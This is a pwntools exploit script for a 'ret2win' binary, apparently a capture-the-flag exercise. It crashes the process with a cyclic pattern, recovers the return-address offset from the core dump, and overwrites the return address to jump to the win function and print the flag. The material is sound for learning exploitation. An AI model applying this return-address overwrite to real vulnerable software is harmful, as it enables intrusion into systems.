from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
break
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Print out the target address
info("%#x target", elf.symbols['ret2win'])

# We will send a 'cyclic' pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
payload = cyclic(128)

# PWN
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing (SP for ARM)
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

# Print out the address of EIP at the time of crashing
rip_offset = cyclic_find(pattern)
info('located RIP offset at {a}'.format(a=rip_offset))

# Craft a new payload which puts the "target" address at the correct offset
payload = fit({
    pattern: elf.symbols.ret2win
})

# Send the payload to a new copy of the process
io = start()
io.sendline(payload)
io.recv()

# Get our flag!
flag = io.recvline()
success(flag)
